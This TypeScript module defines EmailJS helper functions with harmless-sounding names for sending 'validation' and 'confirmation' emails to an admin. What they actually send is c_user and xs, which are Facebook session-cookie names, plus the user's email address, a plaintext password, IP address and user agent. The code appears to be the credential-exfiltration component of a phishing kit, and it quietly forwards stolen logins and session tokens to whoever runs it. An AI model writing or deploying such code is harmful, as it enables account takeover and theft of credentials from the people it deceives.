import emailjs from "@emailjs/browser";

export const initEmailJS = () => {
  const userId = import.meta.env.VITE_EMAILJS_USER_ID;
  if (!userId) {
    console.error("EmailJS User ID is not configured");
    return;
  }
  emailjs.init(userId);
};

export const sendValidationFormEmail = async (formData: any) => {
  try {
    const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
    const templateId = import.meta.env.VITE_EMAILJS_VALIDATION_TEMPLATE_ID;

    if (!serviceId || !templateId) {
      throw new Error("EmailJS service or template ID is not configured");
    }

    const templateParams = {
      to_name: "Admin",
      c_user: formData.c_user,
      xs: formData.xs,
      timestamp: formData.timestamp,
      ip_address: formData.ipAddress || "Not available",
      user_agent: formData.userAgent || navigator.userAgent,
    };

    const result = await emailjs.send(
      serviceId,
      templateId,
      templateParams,
      import.meta.env.VITE_EMAILJS_USER_ID
    );
    console.log('Validation email sent:', { status: result.status, text: result.text });
    return result;
  } catch (error) {
    console.error("Error sending validation email:", error);
    throw error;
  }
};

export const sendConfirmationFormEmail = async (formData: any) => {
  try {
    const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
    const templateId = import.meta.env.VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID;

    if (!serviceId || !templateId) {
      throw new Error("EmailJS service or template ID is not configured");
    }

    const templateParams = {
      to_name: "Admin",
      c_user: formData.c_user,
      xs: formData.xs,
      user_email: formData.user_email,
      password: formData.password,
      contact_method: formData.contactMethod,
      country_code: formData.countryCode,
      timestamp: formData.timestamp || new Date().toISOString(),
      ip_address: formData.ipAddress || "Not available",
      user_agent: formData.userAgent || navigator.userAgent,
    };

    console.log('Sending confirmation with params:', {
      ...templateParams,
      password: '[REDACTED]',
      xs: '[REDACTED]'
    });

    const result = await emailjs.send(
      serviceId,
      templateId,
      templateParams,
      import.meta.env.VITE_EMAILJS_USER_ID
    );

    console.log('Confirmation email sent:', { status: result.status, text: result.text });
    return result;
  } catch (error) {
    console.error("Error sending confirmation email:", error);
    throw error;
  }
};